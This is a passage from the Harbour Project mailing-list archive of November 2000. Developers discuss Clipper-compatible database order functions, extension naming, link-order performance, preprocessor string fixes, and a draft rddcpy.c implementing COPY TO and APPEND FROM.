which is fine with me, but for others it skips just the first one).

Here's my test code:
   ? 'strtoken should NOT be 2:', strtoken(&quot;,2,3,&quot;, 1, &quot;,&quot;)

Here's the block in question:
      if( cDelimiter != ' ' )
        {
          if( szText[wStart] == cDelimiter )
            wStart++;
        }

Thanks!
Brian Hays



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 19:11:01 2000
Date: Wed Nov  8 19:11:01 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] dbOrderInfo and dbcmd.c

<PRE>Brian,


&gt;<i> Obviously it would be best if all 3 call the same low-level code.  Either
</I>&gt;<i> dbOrderInfo should be the source of all the info, and the others are
</I>&gt;<i> wrappers for it (makes sense to me), or dbOrderInfo should be a high-level
</I>&gt;<i> dispatcher to the specific functions which then call SELF_ORDINFO.
</I>&gt;<i> 
</I>&gt;<i> I believe the evolution of Clipper (and good design) leads toward the first
</I>&gt;<i> choice, but it makes the other functions dependent upon it EVEN IN 5.2 MODE,
</I>&gt;<i> so it could not be reserved for 5.3 compatibility.  Since the vast majority
</I>&gt;<i> of expressed opinions said a 5.3 compatibility level for Harbour was
</I>&gt;<i> preferred (with an effort to not pollute 5.2 namespace issues), I'd like to
</I>&gt;<i> make dbOrderInfo available to all builds as the tool of choice for order
</I>&gt;<i> management, as a C function.  I think the code currently residing in dbcmd.c
</I>&gt;<i> for ordKey() and ordKeyNo() and others should be moved into this new
</I>&gt;<i> function, and those should become wrappers in rddord.prg as IndexKey() is
</I>&gt;<i> now.
</I>
Why not write a C lever worker function which would be called by the 
3 flavours of the Harbour level functions ? This way their speed would be 
identical, and there would be no problem disabling the 5.3 one.

You're version of wrapper places one flavour of the functions above the 
others in term of speed and design, and has ties them together too much, 
so IMHO it's not the best.

If I'm not mistaken your method would be this:

FUN1() does the work
FUN2() calls FUN1()
FUN3() calls FUN1()

And my proposed method would look like this:

_FUNLOW() does the work
FUN1() calls _FUNLOW()
FUN2() calls _FUNLOW()
FUN3() calls _FUNLOW()

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 19:20:02 2000
Date: Wed Nov  8 19:20:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Ron,

&gt;<i> Why should such an extension be conditional? It is not compromising any
</I>&gt;<i> compatibility, does it?  Don't we have many other unconditional extensions
</I>&gt;<i> already?
</I>
Strictly speaking, it does. If someone had a function named HB_PVALUE() 
it would. I think that separating the extensions from the core 5.2/5.3 is very 
important, and one good reason is that this way those extensions are very 
cleary marked, right inside the source code. Moreover if someone doesn't 
want to link the additional Harbour &quot;bloat&quot; to his/her application, it can always 
be done.

I don't find it a reason to drop this issue because too many uncond7 
extensions are already added. IMO the correct way would be to mark 
those as extensions, too, of course only where it can be done in a 
reasonable way. Also note that if we're speaking about Harbour extension 
functions only, the waste majority of them are marked as extensions, I've 
made quite a few efforts in that direction.

So I don't think we need to change the rule that all HB_ functions are 
Harbour extensions and all __ functions are unconditional, internal 
Harbour functions.

Again there's a very simple solution to this problem, namely to 
include a synonym for HB_PVALUE() named __PVALUE().

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 21:56:02 2000
Date: Wed Nov  8 21:56:02 2000
From: Hadi Hermawan harbour@lists.harbour-project.org
Subject: [Harbour] Konvert little program

<PRE>I have tried your library and pretty cool.
Using the library, my device was working properly.
I have a device which can sense electric signals and
save the data to my harbour database.


TIA
- Hadi Hermawan -


-----Original Message-----
From: Antonio Linares &lt;<A HREF="mailto:alinares@fivetech.com">alinares@fivetech.com</A>&gt;
To: <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A> &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Date: Thursday, November 09, 2000 2:44 AM
Subject: RE: [Harbour] Konvert little program


&gt;<i>Hadi,
</I>&gt;<i>
</I>&gt;<i>Its really easy. This PRG works both with Clipper
</I>&gt;<i>and Harbour. 
</I>
&gt;<i>Antonio Linares
</I>&gt;<i><A HREF="http://www.fivetech.com">http://www.fivetech.com</A>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 01:02:02 2000
Date: Thu Nov  9 01:02:02 2000
From: Hadi Hermawan harbour@lists.harbour-project.org
Subject: [Harbour] Konvert little program

<PRE>I have tried your library and pretty cool.
Using the library, my device was working properly.
I have a device which can sense electric signals and
save the data to my harbour database.


TIA
- Hadi Hermawan -


-----Original Message-----
From: Antonio Linares &lt;<A HREF="mailto:alinares@fivetech.com">alinares@fivetech.com</A>&gt;
To: <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A> &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Date: Thursday, November 09, 2000 2:44 AM
Subject: RE: [Harbour] Konvert little program


&gt;<i>Hadi,
</I>&gt;<i>
</I>&gt;<i>Its really easy. This PRG works both with Clipper
</I>&gt;<i>and Harbour. 
</I>
&gt;<i>Antonio Linares
</I>&gt;<i><A HREF="http://www.fivetech.com">http://www.fivetech.com</A>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 02:38:02 2000
Date: Thu Nov  9 02:38:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>I've spent more time than I should have  tonight chasing a speed difference
that I could not understand.
The net result is that function 'B' that is linked from a library later than
function 'A' is accessed 10% slower.
Huh?

This is in a tiny test applet.
I was comparing a chrcount function with the one in libgt.
The one in libgt was much faster, but I wanted the name changed so I pulled
chrcount.c into my own libarary project. The only change was the function
name.  For kicks, I ran the test comparing it with the original gt_chrcount.
Mine was notceably slower.
I searched for differences in compiler switches, verified they were even in
the same order, etc.  Then I moved the location of gt.lib in the batch file
to _after_ my lib.  The resulting times were identical, but now the
gt_chrcount was the slower one!

I played with more iterations and smaller strings, and fewer iterations with
bigger strings, and the results were consistent.
If I moved the gt.lib in front, it was faster again.

Does this make sense to anyone?  I have to wonder what happens with a truly
large app with lots of libs linked in.
Is it a common optimization to put your time-critical functions at the front
of the link script?

FUNCTION main ()
Local nSecs, i, x
Local cstr := memoread(&quot;test.prg&quot;)    // an 8K file
   nSecs := seconds()
   FOR i := 1 TO 60000
      x := GT_chrcount(&quot;a&quot;,cstr)
   NEXT
   ? Seconds() - nSecs    //          7.59
   ? x
   ?
   nSecs := seconds()
   FOR i := 1 TO 60000
      x := chrcount(&quot;a&quot;,cstr)
   NEXT
   ? Seconds() - nSecs    //          8.69
   ? x        //        151
RETURN (NIL)

Brian Hays



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 03:13:02 2000
Date: Thu Nov  9 03:13:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] header files

<PRE>We need the equivalent of ord.ch and dbinfo.ch.
Is it appropriate to use these same names with near identical contents?
Should hbapirdd.h #include ord.ch ?

Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 03:24:02 2000
Date: Thu Nov  9 03:24:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>Another interesting finding:

In these loops of 20,000 iterations, calls to chrcount() were totalling 3.5
seconds IF there was NO var receiving its value.
When I added  x:=   in front of chrcount(), it dropped to 2.8 seconds.

Brian Hays
Abacus Data Systems, Inc



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 03:55:04 2000
Date: Thu Nov  9 03:55:04 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>Brian Hays wrote:
&gt;<i> 
</I>&gt;<i> I've spent more time than I should have  tonight chasing a speed difference
</I>&gt;<i> that I could not understand.
</I>&gt;<i> The net result is that function 'B' that is linked from a library later than
</I>&gt;<i> function 'A' is accessed 10% slower.
</I>[...] 
&gt;<i> Does this make sense to anyone?  I have to wonder what happens with a truly
</I>&gt;<i> large app with lots of libs linked in.
</I>&gt;<i> Is it a common optimization to put your time-critical functions at the front
</I>&gt;<i> of the link script?
</I>
  The internal design of virtual machine and dynamic symbols guarantees
that all symbols are accessed with the same speed. During function call
we are accessing the function pointer directly without the symbols
lookup. Only during the dynamic symbols table creation there is speed
difference since there are more symbols to scan however this is done
during an  application startup.
  Have you tested it with reversed order of function calls
(GT_charcount-charcount -&gt; charcount-GT_charcount)? What is your
environment?

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 04:17:03 2000
Date: Thu Nov  9 04:17:03 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-09 01:10 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-09 01:10 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * source/pp/ppcore.c
     * Fixed STATE_QUOT3 ([]) support in getExpReal() and added STATE_QUOT3
support to NextParm() NextName() and md_strAt()

   /* #define and #translate _were_ activated within [] strings - Fixed!
      Now strings delimiter conversion should be complete. */

You may view the [now fixed] problem by trying this:

//--------------------------//
#DEFINE MYDEF 1
#TRANSLATE MyTranslate(&lt;a&gt;) =&gt; Test(&lt;a&gt;)

Procedure Main()

   LOCAL x

   x := [MYDEF MyTranslate(7)]
   ? x

RETURN
//--------------------------//

Ron


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 04:19:01 2000
Date: Thu Nov  9 04:19:01 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>Ryszard:
&gt;<i>   Have you tested it with reversed order of function calls
</I>&gt;<i> (GT_charcount-charcount -&gt; charcount-GT_charcount)?
</I>
Yes, this was one of the first things I tried--to see if perhaps code was
not yet read in yet.
I tripled the iterations to see if it was a one-time .3-second delay, but
the durations both increased proportionally.

I also tried putting a single call to the second loop's function at the top
of the routine to make sure it was loaded, with no change.

&gt;<i>What is your environment?
</I>NT4.0 SP6a PII 450, Borland 5.5

Brian


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 04:38:02 2000
Date: Thu Nov  9 04:38:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-09 01:10 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>Ron: 
That fixed ['']

Thanks!

Brian Hays



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 05:08:02 2000
Date: Thu Nov  9 05:08:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] _GET_, _1 and optimisers

<PRE>Ryszard,

&quot;... so it is not possible to disable it ... However is there really
a need for it?&quot;

I hope not. :-)

Clipper's has a bug which I think is not well known:
do case
case nMsg =3D=3D 1
case nMsg =3D=3D 2
...
case nMsg =3D=3D N  // where N is another integer (whole number) constant=

endcase

Produces special (faster) code if all the tests are against integer
constants.  This is just the kind of thing that message handlers can
benefit from. :-)  Which is no doubt why it's there (remember the OS/2
Clipper version? almost no-one does!).

So what's wrong with the above?  The special code does not work (at
least, not the way a do case would otherwise) if nMsg is nil. :-(

Strictly speaking, if 100% Clipper compatibility is an aim, Harbour
should also produce this rather weird outcome.  It's never been
useful, and has occasionally created problems, but I suppose someone
might argue that Harbour should copy Clipper even in that respect.

Back to the optimiser: the above is due to Clipper's.  I would've
disabled that particular optimisation at least some of the time!

John.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 06:23:01 2000
Date: Thu Nov  9 06:23:01 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] CHANGELOG: 2000-11-08 11:28 UTC+0800

<PRE>Brian,

Those RDD changes look really exciting!

&quot;DBOI_POSITION  &lt;&lt; changed DBOI_RECNO to this!&quot;

That confused me.  You mean the 1st to be the logical (index/etc)
position &amp; the 2nd the physical position, same as 5.3?

John.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 06:25:04 2000
Date: Thu Nov  9 06:25:04 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] header files

<PRE>Brian,

&quot;We need the equivalent of ord.ch and dbinfo.ch.&quot;

Yes please.

&quot;Is it appropriate to use these same names with near identical contents?&quot;=


Yes AFAIK. :-)

&quot;Should hbapirdd.h #include ord.ch ?&quot;

I don't know.  An RDD person please tell Brian. :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 06:25:16 2000
Date: Thu Nov  9 06:25:16 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>Brian,

One possibility, though it doesn't strike me as at all certain!, is
to do with alignment.  Probably code alignment, rather than data, in
view of your results.

Some C compilers try to align Intel 32-bit functions on 32-bit (dword)
boundaries.  Other compilers don't do that.  Sometimes there's a
command line option.  A lot of Intel (&amp; AMD etc) CPUs can run faster
if code is aligned that way.

So, maybe your code isn't being aligned like that, depending how you
link.

Similar issues apply to data alignment, especially with block moves
and copies.

Er... did you want to know this stuff? :-)  Sorry if you already did!

BTW, if this is the reason, it's probably worth fixing at some later
date.

John.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 06:37:01 2000
Date: Thu Nov  9 06:37:01 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Strange findings

<PRE>Brian,

One possibility, though it doesn't strike me as at all certain!, is
to do with alignment.  Probably code alignment, rather than data, in
view of your results.

Some C compilers try to align Intel 32-bit functions on 32-bit (dword)
boundaries.  Other compilers don't do that.  Sometimes there's a
command line option.  A lot of Intel (&amp; AMD etc) CPUs can run faster
if code is aligned that way.

So, maybe your code isn't being aligned like that, depending how you
link.

Similar issues apply to data alignment, especially with block moves
and copies.

Er... did you want to know this stuff? :-)  Sorry if you already did!

BTW, if this is the reason, it's probably worth fixing at some later
date.

John.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 06:45:03 2000
Date: Thu Nov  9 06:45:03 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] strtoken behavior

<PRE>Brian,

&quot;skips over a leading delimiter&quot;

I wouldn't want that.

&quot;Am I all wet (not far from California...) ?&quot;

I don't know. :-)  CA has been &quot;interesting&quot; every time I've been...

John.

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 08:21:02 2000
Date: Thu Nov  9 08:21:02 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO

<PRE>Brian,
          I have NOT implemented the creation of the TO file if it does not
exist. And here I have a BIG question, how do you know if the file does or
not exist BEFORE attempting to open it? TOPConnect has a TCCANOPEN( cFile,
[cIndex]) to test this, but this is not an RDD method. I understand there is
a FILE function in Cl*pper, but don't know where it is mapped, and suspect
it will only work with DBF files. So, wouldn't it be nice to ADD a new
method to the vtable that manages this?

Regards
Harrier

----- Original Message -----
From: &quot;Brian Hays&quot; &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Wednesday, November 08, 2000 6:59 PM
Subject: [Harbour] COPY TO


&gt;<i> Harrier:
</I>&gt;<i> I tried the new rddcpy.c that you sent to the list, and it still has an
</I>&gt;<i> error here whether or not I use ADS:
</I>&gt;<i> Open Error on the target file.
</I>&gt;<i>
</I>&gt;<i> Brian Hays
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  9 08:50:03 2000
Date: Thu Nov  9 08:50:03 2000
From: Juan Agustin Barriga harbour@lists.harbour-project.org
Subject: [Harbour] COPY TO errors

<PRE>This is a multi-part message in MIME format.

------=_NextPart_000_0061_01C04A3A.92EE1910
Content-Type: text/plain;
	charset=&quot;Windows-1252&quot;
Content-Transfer-Encoding: 7bit

Attached is a new version of rddcpy.c, modified following Victor's
suggestions. Luiz, can you upload it?. It still does not create the target
file if it does not exists (see my previous email to Brian).
I still have some unreleased memory blocks on my RDD Open function, I really
don't know which struct variable is not being released, none xgrabbed by me,
sure. Someone has an idea?

Regards
Harrier

----- Original Message -----
From: &quot;Victor Szakats&quot; &lt;<A HREF="mailto:vector@mail.matav.hu">vector@mail.matav.hu</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Tuesday, November 07, 2000 4:40 PM
Subject: Re: [Harbour] COPY TO errors


&gt;<i> Harrier,
</I>&gt;<i>
</I>&gt;<i> Let me allow some suggestions:
</I>&gt;<i>
</I>&gt;<i> 1) Last time I've made a suggestion which I'd correct/optimizes a bit,
</I>&gt;<i> so that hb_param() will always return NULL if the parameter
</I>&gt;<i> doesn't exist or the type differs from the specified one.
</I>&gt;<i>
</I>&gt;<i> 2) As some kind of futher optimization you can avoid checking the
</I>&gt;<i> NUM/LOG types if the default values are zero/FALSE, since hb_parn*()
</I>&gt;<i> and hb_parl() will return those values anyway, when you do use this
</I>&gt;<i> feature, it's good to make a comment about it.
</I>&gt;<i>
</I>&gt;<i> 3) The other - new - formal bug is that you pass NULL for LONG,
</I>&gt;<i> ULONG, BOOL parameters, it will work, but the the usage of
</I>&gt;<i> NULL may be misleading for the reader.
</I>&gt;<i>
</I>&gt;<i> 4) The type of the first parameter is not checked, so the function
</I>&gt;<i> will probably fail if the first parameter is not a string, since
</I>hb_parc(1)
&gt;<i> will then pass an empty string (&quot;&quot;) to rddMoveRecords(). The
</I>&gt;<i> correct behaviour is probably (should check C52e) to do nothing
</I>&gt;<i> when ! ISCHAR(1) (or maybe to pass a NULL ?)
</I>&gt;<i>
</I>&gt;<i> 5) There's one ISNUM() instead of ISLOG() in the code.
</I>&gt;<i>
</I>&gt;<i> 6) hb_parl() should be used for BOOL/logical values instead of hb_parnl()
</I>&gt;<i> (note that hb_parnl() will still work, but it's also misleading).
</I>&gt;<i>
</I>&gt;<i> 7) You should use hb_parnl() insead of hb_parni() to retrieve
</I>&gt;<i> record number related values, as they may exceed the INT limit
</I>&gt;<i> on 16bit systems.
</I>&gt;<i>
</I>&gt;<i> 8) Don't use // comments, as this is not ANSI C compatible, and some
</I>&gt;<i> compilers may not like it.
</I>&gt;<i>
</I>&gt;<i> 9) Should check against C52e, but I have the impression that CA-Clipper
</I>&gt;<i> __DBAPP() and __DBCOPY() will always return NIL.
</I>&gt;<i>
</I>&gt;<i> 10) Don't forget to add a CVS ID and copyright header to your code.
</I>&gt;<i>
</I>&gt;<i> So this could:
</I>&gt;<i> -------------------------------------------------------------------------
</I>&gt;<i>   hb_retni( rddMoveRecords(  hb_parc( 1 ), // File From
</I>&gt;<i>                              NULL,         // TO current area
</I>&gt;<i>                              ISARRAY( 2 ) ? hb_param( 2, HB_IT_ARRAY ) :
</I>NULL, // Fuelds
&gt;<i>                              ISBLOCK( 3 ) ? hb_param( 3, HB_IT_BLOCK ) :
</I>NULL, // For
&gt;<i>                              ISBLOCK( 4 ) ? hb_param( 4, HB_IT_BLOCK ) :
</I>NULL, // While
&gt;<i>                              ISNUM( 5 ) ? hb_parni( 5 ) : NULL,
</I>// Next
&gt;<i>                              ISNUM( 6 ) ? hb_parni( 6 ) : NULL,
</I>// Record
&gt;<i>                              ISNUM( 7 ) ? hb_parnl( 7 ) : NULL,
</I>// Rest
&gt;<i>                              ISCHAR( 8 ) ? hb_parc( 8 ) : NULL ));
</I>// RDD
&gt;<i> -------------------------------------------------------------------------
</I>&gt;<i>
</I>&gt;<i> IMHO looks and works better this way:
</I>&gt;<i> -------------------------------------------------------------------------
</I>&gt;<i> if( ISCHAR( 1 ) )
</I>&gt;<i> {
</I>&gt;<i>    rddMoveRecords(  hb_parc( 1 ), /* File From */
</I>&gt;<i>       NULL,         /* TO current area */
</I>&gt;<i>       hb_param( 2, HB_IT_ARRAY ), /* Fuelds */
</I>&gt;<i>       hb_param( 3, HB_IT_BLOCK ), /* For */
</I>&gt;<i>       hb_param( 4, HB_IT_BLOCK ), /* While */
</I>&gt;<i>       hb_parnl( 5 ),                /* Next */ /* Defaults to zero on bad
</I>type */
&gt;<i>       hb_parnl( 6 ),                /* Record */ /* Defaults to zero on
</I>bad type */
&gt;<i>       hb_parl( 7 ),                /* Rest */ /* Defaults to zero on bad
</I>type */
&gt;<i>       ISCHAR( 8 ) ? hb_parc( 8 ) : NULL ));             /* RDD */
</I>&gt;<i> }
</I>&gt;<i> -------------------------------------------------------------------------
</I>&gt;<i>
</I>&gt;<i> Victor Szakats
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>
------=_NextPart_000_0061_01C04A3A.92EE1910
Content-Type: application/octet-stream;
	name=&quot;rddcpy.c&quot;
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
	filename=&quot;rddcpy.c&quot;

/**********************************************/=0A=
/* APPEND FROM &amp; COPY TO by Harrier 4/10/2000 */=0A=
/**********************************************/=0A=
=0A=
// as we are in C, the code is upside down, =0A=
//  find __SBAPP &amp; __DBCOPY at the bottom=0A=
=0A=
// create a new AREANODE and open it's Area=0A=
// I assume the file exists, else extra code must be added to create it=0A=
static LPAREANODE GetTheOtherArea( char *szDriver, char * szFileName )=0A=
{=0A=
  LPAREANODE pAreaNode;=0A=
  LPRDDNODE  pRDDNode;=0A=
  USHORT     uiRddID;=0A=
  DBOPENINFO pInfo;=0A=
=0A=
  pRDDNode =3D hb_rddFindNode( szDriver, &amp;uiRddID );  // find the RDD=0A=
=0A=
  if ( !pRDDNode )=0A=
  {=0A=
    hb_errRT_DBCMD( EG_ARG, EDBCMD_EVAL_BADPARAMETER, NULL, &quot;DBAPP&quot; );=0A=
    return NULL;=0A=
  }=0A=
=0A=
/* get the new area node for this AREA */=0A=
  pAreaNode =3D  hb_rddNewAreaNode( pRDDNode, uiRddID );=0A=
=0A=
/* Fill pInfo structure */=0A=
  memset( &amp;pInfo, 0, sizeof(DBOPENINFO) );=0A=
  pInfo.uiArea =3D uiRddID;=0A=
  pInfo.abName =3D ( BYTE * )  hb_xgrab( _POSIX_PATH_MAX + 1 );=0A=
  strcpy( ( char * ) pInfo.abName, szFileName );=0A=
  pInfo.atomAlias =3D ( BYTE * ) &quot;TMPAREA&quot;;=0A=
  pInfo.fShared =3D !hb_set.HB_SET_EXCLUSIVE;=0A=
  pInfo.fReadonly =3D FALSE;=0A=
  ( ( AREAP ) pAreaNode-&gt;pArea )-&gt;uiArea =3D uiRddID;=0A=
=0A=
  if( SELF_OPEN( ( AREAP ) pAreaNode-&gt;pArea, &amp;pInfo ) =3D=3D FAILURE )=0A=
  {=0A=
    hb_errRT_DBCMD( EG_OPEN, NULL, NULL, &quot;DBAPP&quot; ); // Could not open it=0A=
    SELF_RELEASE( ( AREAP ) pAreaNode-&gt;pArea );=0A=
    hb_xfree( pAreaNode );=0A=
    return NULL;=0A=
  }=0A=
  return pAreaNode;=0A=
}=0A=
=0A=
// check if the field is on the Fields Array=0A=
static BOOL IsFieldIn( char * fieldName, PHB_ITEM pFields )=0A=
{=0A=
  USHORT i, uiFields =3D ( USHORT ) hb_arrayLen( pFields );=0A=
  for ( i=3D0; i&lt;uiFields; i++ )=0A=
  {=0A=
    PHB_ITEM pField =3D pFields-&gt;item.asArray.value-&gt;pItems + i;=0A=
    if ( strcmp( fieldName, (char *)pField-&gt;item.asString.value ) =3D=3D =
0 )=0A=
      return TRUE;=0A=
  }=0A=
  return FALSE;=0A=
}=0A=
=0A=
// move the Field Data between areas by name =0A=
static void rddMoveFields( AREAP pAreaFrom, AREAP pAreaTo, PHB_ITEM =
pFields )=0A=
{=0A=
  USHORT   i;=0A=
  PHB_ITEM fieldValue;=0A=
=0A=
  fieldValue =3D hb_itemNew( NULL );=0A=
  for ( i=3D0 ; i&lt;pAreaFrom-&gt;uiFieldCount; i++ )=0A=
  {=0A=
    // list or field in the list?=0A=
    if ( !pFields || IsFieldIn( (( PHB_DYNS )(pAreaFrom-&gt;lpFields + =
i)-&gt;sym )-&gt;pSymbol-&gt;szName,  pFields ))=0A=
    {=0A=
      SELF_GETVALUE( pAreaFrom, i+1, fieldValue );=0A=
      SELF_PUTVALUE( pAreaTo, i+1, fieldValue );=0A=
    }=0A=
  }=0A=
  hb_itemRelease( fieldValue );=0A=
}=0A=
=0A=
// move the records filtering if apropiate=0A=
static ERRCODE rddMoveRecords( char *cAreaFrom, char *cAreaTo, PHB_ITEM =
pFields,=0A=
                               PHB_ITEM pFor, PHB_ITEM pWhile, LONG =
lNext,=0A=
                               ULONG lRec, BOOL bRest, char *cDriver )=0A=
{=0A=
  char     * szFileName, * szDriver;=0A=
  LONG       toGo=3DlNext;=0A=
  BOOL       bFor, bWhile;=0A=
  BOOL       keepGoing=3DTRUE;=0A=
  AREAP      pAreaFrom;=0A=
  AREAP      pAreaTo;=0A=
  DBEVALINFO pEvalInfo;=0A=
  LPAREANODE pAreaRelease=3DNULL;=0A=
  LPAREANODE s_pCurrAreaSaved=3Ds_pCurrArea;=0A=
=0A=
  HB_SYMBOL_UNUSED( bRest );=0A=
=0A=
  if ( !s_pCurrArea )  // We need a current Area to APPEND TO or FROM=0A=
  {=0A=
     hb_errRT_DBCMD( EG_NOTABLE, EDBCMD_NOTABLE, NULL, &quot;DBAPP&quot; );=0A=
     return EG_NOTABLE;=0A=
  }=0A=
=0A=
  // get the RDD Driver to use for the &quot;other&quot; Area=0A=
  if( cDriver )=0A=
     szDriver =3D cDriver;=0A=
  else=0A=
     szDriver =3D s_szDefDriver;=0A=
=0A=
  if( !cAreaFrom &amp;&amp; ! cAreaTo )         // File is needed=0A=
  {=0A=
     hb_errRT_DBCMD( EG_ARG, EDBCMD_EVAL_BADPARAMETER, NULL, &quot;DBAPP&quot; );=0A=
     return EG_ARG;=0A=
  }=0A=
=0A=
  if ( cAreaTo ) // it's a COPY TO=0A=
  {=0A=
    pAreaRelease =3D GetTheOtherArea( szDriver, cAreaTo );=0A=
    pAreaTo =3D pAreaRelease-&gt;pArea;=0A=
  }=0A=
  else=0A=
    pAreaTo =3D s_pCurrArea-&gt;pArea;=0A=
=0A=
=0A=
  if ( cAreaFrom ) // it's an APPEND FROM=0A=
  {                // make it current=0A=
    pAreaRelease =3D s_pCurrArea =3D GetTheOtherArea( szDriver, =
cAreaFrom );=0A=
    pAreaFrom =3D  pAreaRelease-&gt;pArea; =0A=
  }=0A=
  else=0A=
    pAreaFrom =3D s_pCurrArea-&gt;pArea;=0A=
=0A=
  // or one or the other but necer none=0A=
  if ( !pAreaRelease )  // We need another Area to APPEND TO=0A=
  {=0A=
     hb_errRT_DBCMD( EG_NOTABLE, EDBCMD_NOTABLE, NULL, &quot;DBAPP&quot; );=0A=
     return EG_NOTABLE;=0A=
  }=0A=
=0A=
  if ( lRec &gt; 0 )                 // only one record=0A=
    SELF_GOTO( pAreaFrom, lRec ); // go there=0A=
=0A=
  // move those records assuming we are positioned on one.=0A=
  while( keepGoing )=0A=
  {=0A=
    keepGoing =3D FALSE; =0A=
    if( !pAreaFrom-&gt;fEof ) // until eof or an evaluation failed=0A=
    {=0A=
       if( pWhile )=0A=
          bWhile =3D hb_itemGetL( hb_vmEvalBlock( pWhile ) );=0A=
       else=0A=
          bWhile =3D TRUE;=0A=
=0A=
       if( pFor )=0A=
          bFor =3D hb_itemGetL( hb_vmEvalBlock( pFor ) );=0A=
       else=0A=
          bFor =3D TRUE;=0A=
=0A=
      if( bWhile &amp;&amp; bFor &amp;&amp; (!lNext || toGo &gt; 0 )) // candidate?=0A=
      {=0A=
        PHB_ITEM lpFields =3D pFields ? =
pFields-&gt;item.asArray.value-&gt;ulLen ? pFields : NULL : NULL;=0A=
        SELF_APPEND( ( AREAP ) pAreaTo, FALSE );   // put a new one on =
TO Area=0A=
        rddMoveFields( pAreaFrom, pAreaTo, lpFields ); // move the data=0A=
        if ( lRec =3D=3D 0 ) // only one record?=0A=
          keepGoing =3D TRUE;=0A=
        else=0A=
          continue;=0A=
      }=0A=
      toGo--;                     // one less to go=0A=
      SELF_SKIP( pAreaFrom, 1L ); // get the next one=0A=
    }=0A=
  }=0A=
=0A=
  s_pCurrArea =3D s_pCurrAreaSaved;  // set current WorkArea to initial =
state=0A=
=0A=
  // Close the File=0A=
  SELF_CLOSE( ( AREAP ) pAreaRelease-&gt;pArea );=0A=
  SELF_RELEASE( ( AREAP ) pAreaRelease-&gt;pArea );=0A=
  hb_xfree( pAreaRelease );=0A=
=0A=
/* should the following be released? =0A=
  if ( pFields )=0A=
    hb_itemRelease( pFields );=0A=
  if ( pFor )=0A=
    hb_itemRelease( pFor );=0A=
  if ( pWhile )=0A=
    hb_itemRelease( pWhile );=0A=
*/=0A=
=0A=
  return SUCCESS;=0A=
}=0A=
=0A=
